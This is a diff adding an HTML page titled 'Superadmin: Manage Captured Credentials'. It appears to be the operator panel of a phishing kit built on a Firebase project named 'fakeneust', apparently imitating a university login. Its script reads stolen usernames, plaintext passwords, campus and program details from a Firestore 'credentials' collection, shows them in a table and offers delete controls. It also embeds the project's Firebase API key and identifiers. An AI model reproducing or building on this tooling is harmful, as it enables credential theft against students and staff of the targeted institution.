@@ -1,0 +1,177 @@
+<!DOCTYPE html>
+<html>
+
+<head>
+    <title>Superadmin - Manage Credentials</title>
+    <style>
+        body {
+            font-family: sans-serif;
+            padding: 20px;
+            background: #fdfdfd;
+        }
+
+        table {
+            width: 100%;
+            border-collapse: collapse;
+            margin-top: 20px;
+        }
+
+        th,
+        td {
+            border: 1px solid #ddd;
+            padding: 8px;
+            text-align: left;
+        }
+
+        th {
+            background: #f2f2f2;
+        }
+
+        .btn-delete {
+            background: #dc3545;
+            color: white;
+            border: none;
+            padding: 5px 10px;
+            border-radius: 4px;
+            cursor: pointer;
+        }
+
+        .btn-delete:hover {
+            background: #c82333;
+        }
+
+        .btn-delete-all {
+            background: #dc3545;
+            color: white;
+            border: none;
+            padding: 10px 15px;
+            border-radius: 4px;
+            cursor: pointer;
+            margin-bottom: 10px;
+            font-weight: bold;
+        }
+
+        .btn-delete-all:hover {
+            background: #c82333;
+        }
+    </style>
+</head>
+
+<body>
+    <h1>Superadmin: Manage Captured Credentials</h1>
+    <button id="deleteAllBtn" class="btn-delete-all" style="display:none;">Delete All Records</button>
+    <table id="credsTable">
+        <thead>
+            <tr>
+                <th>Username</th>
+                <th>Password</th>
+                <th>Server</th>
+                <th>Campus</th>
+                <th>Program</th>
+                <th>Timestamp</th>
+                <th>Action</th>
+            </tr>
+        </thead>
+        <tbody>
+            <tr>
+                <td colspan="7">Loading...</td>
+            </tr>
+        </tbody>
+    </table>
+
+    <script type="module">
+        import { initializeApp } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-app.js";
+        import { getFirestore, collection, getDocs, deleteDoc, doc } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-firestore.js";
+
+        // Same Firebase Config
+        const firebaseConfig = {
+            apiKey: "AIzaSyCxS5bpVtVzjxovMGpY0MP8rlr5m-m6Ay0",
+            authDomain: "fakeneust.firebaseapp.com",
+            projectId: "fakeneust",
+            storageBucket: "fakeneust.firebasestorage.app",
+            messagingSenderId: "226469392303",
+            appId: "1:226469392303:web:2a81f09f14a865f095095a"
+        };
+
+        const app = initializeApp(firebaseConfig);
+        const db = getFirestore(app);
+
+        let currentDocs = [];
+
+        async function loadCreds() {
+            const tbody = document.querySelector('#credsTable tbody');
+            const deleteAllBtn = document.getElementById('deleteAllBtn');
+            try {
+                const snapshot = await getDocs(collection(db, "credentials"));
+                tbody.innerHTML = '';
+
+                if (snapshot.empty) {
+                    tbody.innerHTML = '<tr><td colspan="7">No credentials captured yet.</td></tr>';
+                    deleteAllBtn.style.display = 'none';
+                    return;
+                }
+
+                currentDocs = [];
+                snapshot.forEach(d => currentDocs.push({ id: d.id, ...d.data() }));
+                currentDocs.sort((a, b) => new Date(b.timestamp) - new Date(a.timestamp));
+
+                currentDocs.forEach(data => {
+                    const tr = document.createElement('tr');
+                    tr.innerHTML = `
+                        <td>${document.createTextNode(data.username).textContent || ''}</td>
+                        <td>${document.createTextNode(data.password).textContent || ''}</td>
+                        <td>${document.createTextNode(data.server || '').textContent || ''}</td>
+                        <td>${document.createTextNode(data.campus || '').textContent || ''}</td>
+                        <td>${document.createTextNode(data.program || '').textContent || ''}</td>
+                        <td>${new Date(data.timestamp).toLocaleString()}</td>
+                        <td><button class="btn-delete" data-id="${data.id}">Delete</button></td>
+                    `;
+                    tbody.appendChild(tr);
+                });
+
+                deleteAllBtn.style.display = 'inline-block';
+
+                // Add event listeners to individual delete buttons
+                document.querySelectorAll('.btn-delete').forEach(btn => {
+                    btn.addEventListener('click', async (e) => {
+                        const id = e.target.getAttribute('data-id');
+                        if (confirm("Are you sure you want to delete this record?")) {
+                            e.target.textContent = "Deleting...";
+                            e.target.disabled = true;
+                            await deleteDoc(doc(db, "credentials", id));
+                            loadCreds(); // reload table
+                        }
+                    });
+                });
+
+            } catch (e) {
+                console.error(e);
+                tbody.innerHTML = '<tr><td colspan="7" style="color:red">Error loading credentials. Make sure Firestore rules allow read/delete access.</td></tr>';
+            }
+        }
+
+        // Handle Delete All
+        document.getElementById('deleteAllBtn').addEventListener('click', async (e) => {
+            if (confirm("DANGER: Are you sure you want to delete ALL captured credentials? This cannot be undone.")) {
+                e.target.textContent = "Deleting All...";
+                e.target.disabled = true;
+
+                for (let data of currentDocs) {
+                    try {
+                        await deleteDoc(doc(db, "credentials", data.id));
+                    } catch (err) {
+                        console.error("Failed to delete", data.id, err);
+                    }
+                }
+
+                e.target.textContent = "Delete All Records";
+                e.target.disabled = false;
+                loadCreds();
+            }
+        });
+
+        loadCreds();
+    </script>
+</body>
+
+</html>
